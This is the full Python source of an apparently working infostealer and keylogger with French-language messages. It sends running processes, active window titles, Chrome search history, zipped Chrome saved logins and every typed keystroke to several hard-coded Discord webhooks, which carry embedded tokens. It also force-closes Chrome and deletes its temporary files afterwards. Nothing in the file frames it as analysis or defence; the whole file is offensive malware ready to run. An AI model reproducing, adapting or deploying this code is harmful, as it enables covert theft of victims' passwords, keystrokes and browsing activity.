import keyboard, requests, psutil, time, multiprocessing, sqlite3, os, json, zipfile,tempfile,shutil
import pygetwindow as gw
from urllib.parse import urlparse, unquote
from base64 import b64encode

webhook_live_web='https://discord.com/api/webhooks/1144983185860591646/OEsNm58ezkVfp4giOAkXivjLCRTxYVaj1MFttuypsy6CXFQvOfyqranJlK5U_wGRIkQ1'
webhook_software = 'https://discord.com/api/webhooks/1144985771514802287/jnz0dcQorlhyC_YgcL5nNkoUr4WpCopMVETgCBLZtV05zzi9OzGrm2dCYK0yPDKwdARP'
webhook_keylogger = 'https://discord.com/api/webhooks/1144991270549332099/7G5f5T29sOj7mjqPoeXeWqAwyapURhOgXh_RTTOKIFN6QPbk_vAId94xsc3sRmlUZEND'
webhook_history = "https://discord.com/api/webhooks/1145003771353636914/f2w9qqTJff8IDOvdb3h1qNK3wgVjzqQrwKTUlOUaDxbQ0qapnFjMz2kCgpPOfvS_O3q6"
webhook_password = "https://discord.com/api/webhooks/1145014477377523732/BSLe0ydVfek-w3ilFJNBxoBFJw26vWuM27y6_qsZixS5OjOtc6MpseIjN8vgGpNhwpjb"

keys_typed = []

def on_software(webhook_url):
    for proc in psutil.process_iter(['pid', 'name']):
        content = f"PID: {proc.info['pid']}, Nom: {proc.info['name']}"
        r = requests.post(webhook_url, json={'username': 'software', 'content': content})
        print(f'on_software {r.status_code}')

def live_web(webhook_url):
    while True:
        active_window = gw.getActiveWindow()
        if active_window is not None:
            active_win = active_window.title
            time.sleep(1)
            content = active_window.title
            r = requests.post(webhook_url, json={'username': 'live web', 'content': content})
            print(f'liveweb {r.status_code}')


def history():
    MAX_MESSAGE_LENGTH = 2000
    def close_chrome_process():
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if 'chrome' in process.info['name'].lower():
                try:
                    psutil.Process(process.info['pid']).terminate()
                    print(f"Processus Chrome (PID {process.info['pid']}) fermé.")
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass

    def get_chrome_history():
        history_path = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        if os.path.exists(history_path):
            conn = sqlite3.connect(history_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url FROM urls WHERE url LIKE '%search?q=%'")
            search_results = cursor.fetchall()
            conn.close()
            return search_results
        else:
            return []
        
    def send_to_discord(message):
        payload = {
            "content": message
        }
        headers = {
            "Content-Type": "application/json"
        }
        response = requests.post(webhook_history, data=json.dumps(payload), headers=headers)
    
    close_chrome_process()

    if os.path.exists(os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"):
        search_results = get_chrome_history()
        if search_results:
            search_list = [unquote(urlparse(result[0]).query.split("q=")[1].split("&")[0]) for result in search_results]
            numbered_search_list = [f"{i + 1}. {search}" for i, search in enumerate(search_list)]
            message = "\n".join(numbered_search_list)
            message_parts = [message[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(message), MAX_MESSAGE_LENGTH)]
            for part in message_parts:
                send_to_discord(part)
        else:
            pass
    else:
        send_to_discord("Il est impossible de récupérer l'historique car Google Chrome n'est pas installé.")

def get_password():

    def send_zip_to_discord(webhook_url, zip_file_path):
        with open(zip_file_path, "rb") as file:
            file_data = file.read()
        files = {
            "file": ("archive.zip", file_data)
        }
        response = requests.post(webhook_url, files=files)
        if response.status_code == 200:
            pass
        else:
            pass

    def get_chrome_data(db_file):
        connection = sqlite3.connect(db_file)
        cursor = connection.cursor()
        cursor.execute("SELECT * FROM logins")
        rows = cursor.fetchall()
        data = []
        for row in rows:
            converted_row = [b64encode(item).decode('utf-8') if isinstance(item, bytes) else str(item) for item in row]
            data.append(converted_row)
        connection.close()
        return data

    def write_data_to_txt(data, file_path):
        with open(file_path, "w") as file:
            file.write("\n".join(data))

    def delete_folder(folder_path):
        try:
            shutil.rmtree(folder_path)
        except:
            pass

    def delete_zip(zip_file_path):
        try:
            os.remove(zip_file_path)
        except:
            pass

    chrome_db_file = "C:\\Users\\zanat\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    output_folder = "mdp"
    zip_file_path = "chrome_data_mdp.zip"
    temp_dir = tempfile.mkdtemp()   
    chrome_data = get_chrome_data(chrome_db_file)       
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)       
    for index, part in enumerate(chrome_data, start=1):
        url = part[0]
        domain = urlparse(url).netloc
        txt_file_path = os.path.join(output_folder, f"{domain}_{index}.txt")
        write_data_to_txt(part, txt_file_path)      
    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for folder_name, subfolders, filenames in os.walk(output_folder):
            for filename in filenames:
                file_path = os.path.join(folder_name, filename)
                arcname = os.path.relpath(file_path, output_folder)
                zipf.write(file_path, arcname)     
    send_zip_to_discord(webhook_password, zip_file_path) 
    shutil.rmtree(temp_dir)
    folder_to_delete = output_folder
    zip_to_delete = zip_file_path   
    delete_folder(folder_to_delete)
    delete_zip(zip_to_delete)

def keylogger():
    
    def process_keys():
        global keys_typed
        if keys_typed:
            content = ''.join(keys_typed)
            r = requests.post(webhook_keylogger, json={'username': 'keylogger', 'content': content})
            print(f'keylogger {r.status_code}')
            keys_typed = []
    keyboard.add_hotkey('enter', process_keys)
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            if event.name == 'space':
                keys_typed.append(' ')
            elif len(event.name) == 1:
                keys_typed.append(event.name)

if __name__ == "__main__":
    
    webhook_software_process = multiprocessing.Process(target=on_software, args=(webhook_software,))
    live_web_process = multiprocessing.Process(target=live_web, args=(webhook_live_web,))
    keylogger_process = multiprocessing.Process(target=keylogger)
    history_process = multiprocessing.Process(target=history)
    password_process = multiprocessing.Process(target=get_password)
    processes = [webhook_software_process, live_web_process, keylogger_process, history_process,password_process]
    for process in processes:
        process.start()
    for process in processes:
        process.join()